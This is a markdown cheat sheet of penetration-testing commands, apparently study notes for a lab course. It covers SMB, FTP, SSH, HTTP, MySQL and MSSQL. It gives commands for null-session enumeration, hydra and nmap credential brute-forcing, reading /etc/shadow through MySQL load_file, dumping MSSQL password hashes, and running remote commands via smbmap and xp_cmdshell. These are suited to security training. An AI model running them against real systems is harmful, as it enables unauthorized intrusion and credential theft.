
<h4>Servers and Services</h4>

server is called a server because of what it does, it provides some sort of functionality specialized to that machine that can be utilized from other devices. The server can be running a windows operating system, a linux operating system or a macos server. Any computer could be a server depending on how you set it up. 

Servers needs to be accessed remotely. The services running on a server requires opening up a listening port on the server and accepting connections remotely


<h4>SMB</h4>

SMB(sever message block)

To Delete smb shares on a windows box
```
net use * /delete
```

To reconnect smb shares on a windows box. (smbserver_771) is the password
```
net use Z: \\10.4.17.133\c$ smbserver_771 /user:administrator
```

445, is the smb port you focus on if it is open.

To get the protocols smb is running
```
nmap -p445 --script smb-protocols 10.10.10.10 -v
```
To check the security mode
```
nmap -p445 --script smb-security-mode 10.10.10.10 -v
```
To enumerate sessions
```
nmap -p445 --script smb-enum-sessions 10.10.10.10 -v
```
To enumerate sessions with a username and password
```
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.10 -v
```
To enumerate shares
```
nmap -p445 --script smb-enum-shares 10.10.10.10 -v
```
To Enumerate shares with a username and password
```
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.10 -v
```
To enumerate users
```
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.10 -v
```
To enumerate smb server statistics
```
nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.10 -v
```
To enumerate for domains
```
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.10 -v
```
To enumerate for groups
```
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.10 -v
```
To enumerate for services
```
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.10 -v
```
 To connect to smb and list files
 ```
 nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.10.10 -v
```
If the smb version is ```SMBv1``` we can use ```smbmap```
```
smbmap -u guest -p "" -d . -H 10.10.10.10
smbmap -u administrator -p smbserver_771 -d . -H 10.10.10.10
smbmap -u administrator -p smbserver_771 -d . -H 10.10.10.10 -x 'ipconfig'
//to get drives available
smbmap -u administrator -p smbserver_771 -d . -H 10.10.10.10 -L
//connecting to the c drive
smbmap -u administrator -p smbserver_771 -d . -H 10.10.10.10 -r 'C$'
//to download a file
smbmap -u administrator -p smbserver_771 -d . -H 10.10.10.10 --download 'C$\flag.txt'
```


***Linux SMB Enumeration***

For OS discovery
```
nmap 10.10.10.10 -p 445 --script smb-os-discovery
```
using ```nmblookup```
```
nmblookup -A 10.10.10.10
```
using ```rpcclient``` to get os version
```
//-U "" indicates a null session
rpcclient -U "" -N 10.10.10.10
>srvinfo
```
Using ```enum4linux``` to get os version
```
enum4linux -o 10.10.10.10 
```
using ```smbclient```
```
smbclient -L 10.10.10.10 -N
```
using ```enum4linux``` to fuzz for usernames
```
enum4linux -U 10.10.10.10
```
using ```rpcclient``` to fuzz for usernames
```
rpcclient -U "" -N 10.10.10.10
>enumdomusers
>lookupnames (username) //finds SID of users
```
using ```enum4linux``` to enumerate for shares
```
enum4linux -S 10.10.10.10
```
using rpcclient to enumerate for groups
```
rpcclient -U "" -N 10.10.10.10
>enumdomgroups
```




<h4>FTP</h4>
 
using nmap to bruteforce for creds
```
nmap 10.10.10.10 --script ftp-brute --script-args userdb=/path/to/user_list -p21
```
To bruteforce using hydra
```
hydra -L user.txt -P pass.txt ftp://10.10.10.10:21
```
To check for anonymous login
```
nmap 10.10.10.10 -p 21 --script ftp-anon
```




<h4>SSH</h4>

To connect to ssh
```
ssh student@10.10.10.10
```
Bruteforcing using nmap scripting engine
```
nmap 10.10.10.10 --script ssh-brute --script-args userdb=/path/to/user.txt -p22
```

>When using metasploit to bruteforce for passwords it is "userpass_file" if the wordlist istc has both the usename and the password. For example "root:password", "root:arcane"  etc





<h4>HTTP</h4>

Using browsh, this is used if you just have the cli
```
browsh --startup-url http://10.10.10.10/default.aspx
```
using nmap
```
nmap 10.10.10.10 -sV -p80 --script http-enum
```
Detecting webdav configuration
```
nmap 10.10.10.10 -sV -p80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/
```



<h4>MySQL</h4>

Loading file on mysql
```
select load_file("/etc/shadow");
```
To know if empty password is allowed
```
nmap 10.10.10.10 -sV -p3306 --script=mysql-empty-password
```
To know writable dirs using metasploit
```
use auxiliary/scanner/mysql/mysql_writable_dirs
```
To know readable dirs using metasploit
```
use auxiliary/scanner/mysql/mysql_file_enum
```
Bruteforcing for creds
```
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://192.163.7.3
```



<h4>MSSQL</h4>

This is from Microsoft

For info on the server
```
nmap 10.10.10.10 -p1433 --script ms-sql-info
```
checking for ntlm info
```
nmap 10.10.10.10 -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
```
for bruteforcing
```
nmap 10.10.10.10 -p1433 --script ms-sql-brute --script-args userdb=/path/to/user_wordlist,passdb=/path/to/pass_wordlist
```
To check for empty passwords
```
nmap 10.10.10.10 -p1433 --script ms-sql-empty-password
```
To query
```
nmap 10.10.10.10 -p1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=admin,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
```
Dumping hashes
```
nmap 10.10.10.10 -p1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=admin
```
To see if we can run some actual code
```
nmap 10.10.10.10 -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=admin,ms-sql-xp-cmdshell.cmd="ipconfig"
```
Using metasploit
```
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mssql/mssql_enum
use auxiliary/scanner/mssql/mssql_hashdump
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_enum_domain_accounts
```
